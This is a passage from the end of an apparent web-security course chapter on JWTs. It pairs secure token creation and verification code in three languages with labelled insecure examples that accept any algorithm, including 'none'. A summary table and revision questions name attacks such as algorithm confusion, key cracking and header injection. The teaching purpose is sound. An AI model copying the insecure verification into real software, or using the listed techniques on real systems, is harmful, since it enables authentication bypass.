│  [ ] Use refresh tokens for long sessions                    │
│  [ ] Bind tokens to client (IP, user agent, fingerprint)     │
│  [ ] Return tokens in response body, not URL                 │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 9.2 Secure Code Examples

**Node.js (jsonwebtoken):**

```javascript
const jwt = require('jsonwebtoken');

// ═══════════════════════════════════════════════
// SECURE: Enforce algorithm server-side
// ═══════════════════════════════════════════════

// Token creation
function createToken(user) {
  const payload = {
    sub: user.id,
    role: user.role,
    iss: 'https://auth.example.com',
    aud: 'https://api.example.com',
  };
  
  return jwt.sign(payload, PRIVATE_KEY, {
    algorithm: 'RS256',      // Explicit algorithm
    expiresIn: '15m',        // Short-lived
    jwtid: crypto.randomUUID(), // Unique ID for revocation
  });
}

// Token verification — SECURE
function verifyToken(token) {
  try {
    const decoded = jwt.verify(token, PUBLIC_KEY, {
      algorithms: ['RS256'],           // ONLY allow RS256
      issuer: 'https://auth.example.com',
      audience: 'https://api.example.com',
      clockTolerance: 30,              // 30-second tolerance
    });
    return decoded;
  } catch (err) {
    throw new Error('Invalid token');
  }
}

// VULNERABLE — DO NOT DO THIS
function verifyToken_INSECURE(token) {
  const decoded = jwt.verify(token, SECRET_OR_KEY);
  // No algorithm restriction!
  // No issuer/audience validation!
  // Accepts "none" algorithm!
  return decoded;
}
```

**Python (PyJWT):**

```python
import jwt
from datetime import datetime, timedelta, timezone

# SECURE token creation
def create_token(user):
    payload = {
        "sub": str(user.id),
        "role": user.role,
        "iss": "https://auth.example.com",
        "aud": "https://api.example.com",
        "iat": datetime.now(timezone.utc),
        "exp": datetime.now(timezone.utc) + timedelta(minutes=15),
        "jti": str(uuid.uuid4()),
    }
    return jwt.encode(payload, PRIVATE_KEY, algorithm="RS256")

# SECURE token verification
def verify_token(token):
    try:
        decoded = jwt.decode(
            token,
            PUBLIC_KEY,
            algorithms=["RS256"],          # ONLY RS256
            issuer="https://auth.example.com",
            audience="https://api.example.com",
            options={
                "require": ["exp", "iat", "iss", "aud", "sub"],
                "verify_exp": True,
                "verify_iat": True,
                "verify_iss": True,
                "verify_aud": True,
            }
        )
        return decoded
    except jwt.InvalidTokenError as e:
        raise AuthenticationError(f"Invalid token: {e}")

# VULNERABLE — DO NOT DO THIS
def verify_token_INSECURE(token):
    return jwt.decode(token, SECRET, algorithms=None)
    # algorithms=None accepts ANY algorithm including "none"!
```

**Java (jjwt):**

```java
import io.jsonwebtoken.*;
import io.jsonwebtoken.security.Keys;
import java.security.Key;

public class JwtService {
    private final Key signingKey;
    
    // SECURE: Fixed algorithm and key
    public Claims verifyToken(String token) {
        return Jwts.parserBuilder()
            .setSigningKey(signingKey)
            .requireIssuer("https://auth.example.com")
            .requireAudience("https://api.example.com")
            .build()
            .parseClaimsJws(token)   // Only accepts signed JWTs (JWS)
            .getBody();
        // jjwt automatically rejects "none" algorithm
        // and enforces the key's algorithm
    }
}
```

### 9.3 Token Refresh Architecture

```
+──────────────────────────────────────────────────────────────+
│           Access + Refresh Token Architecture                │
+──────────────────────────────────────────────────────────────+
│                                                              │
│   ┌──────────┐    ┌───────────┐    ┌────────────────┐       │
│   │  Client  │    │ Auth      │    │ API Server     │       │
│   │          │    │ Server    │    │                │       │
│   └────┬─────┘    └─────┬─────┘    └───────┬────────┘       │
│        │                │                  │                 │
│   1.   │──── Login ────►│                  │                 │
│        │                │                  │                 │
│   2.   │◄── Access Token (15min) ──│       │                 │
│        │    Refresh Token (7 days) │       │                 │
│        │                │                  │                 │
│   3.   │──── API Request + Access Token ──►│                 │
│        │                │                  │── Validate JWT  │
│        │◄──────────── Response ────────────│                 │
│        │                │                  │                 │
│   4.   │──── API Request (expired token)──►│                 │
│        │◄──────── 401 Unauthorized ────────│                 │
│        │                │                  │                 │
│   5.   │── Refresh Token ──►│              │                 │
│        │◄── New Access Token│              │                 │
│        │                │                  │                 │
│   6.   │──── API Request + New Token ─────►│                 │
│        │◄──────────── Response ────────────│                 │
│                                                              │
│   Access Token:  Short-lived (15-30 min), stateless          │
│   Refresh Token: Long-lived (days/weeks), stored in DB       │
│                  (revocable, single-use)                     │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

---

## Summary Table

| Topic | Key Point |
|---|---|
| **JWT Structure** | Header.Payload.Signature — three Base64URL-encoded parts |
| **Algorithm "none"** | Remove signature, set alg to "none" — bypass verification |
| **Algorithm Confusion** | RS256→HS256: sign with public key as HMAC secret |
| **Key Cracking** | Weak HS256 keys cracked with hashcat/jwt_tool/John |
| **JWK Injection** | Embed attacker's public key in JWT header |
| **JKU Injection** | Point to attacker-controlled JWKS URL |
| **KID Injection** | Directory traversal, SQLi, or command injection via kid |
| **Claim Manipulation** | Change role, sub, exp, permissions claims |
| **Primary Tool** | jwt_tool — comprehensive JWT Swiss Army Knife |
| **Key Defense** | Enforce algorithm server-side, whitelist allowed algorithms |
| **Token Management** | Short-lived access tokens + revocable refresh tokens |

---

## Revision Questions

1. **Explain the three parts of a JWT and the role of each. Why is the payload not encrypted by default, and what are the security implications?**

2. **Walk through the algorithm confusion attack step by step. What conditions make a server vulnerable, and what specific code fix prevents it?**

3. **You have captured a JWT signed with HS256. Describe the complete process of cracking the key using hashcat, including the mode number, command syntax, and what to do once the key is found.**

4. **Compare JWK injection, JKU injection, and KID injection attacks. For each, explain the attack vector, prerequisites, and the specific server-side fix.**

5. **Using jwt_tool, write the exact commands to: (a) decode a JWT, (b) test the "none" algorithm, (c) perform algorithm confusion with a public key, and (d) run all automated attacks against a target URL.**

6. **Design a secure JWT implementation for a microservices architecture with three services. Specify the algorithm choice, key management strategy, claim validation rules, and token refresh mechanism.**

---

*Previous: [04-function-level-access-control.md](04-function-level-access-control.md) | Next: [06-authorization-bypass.md](06-authorization-bypass.md)*

---

*[Back to README](../README.md)*
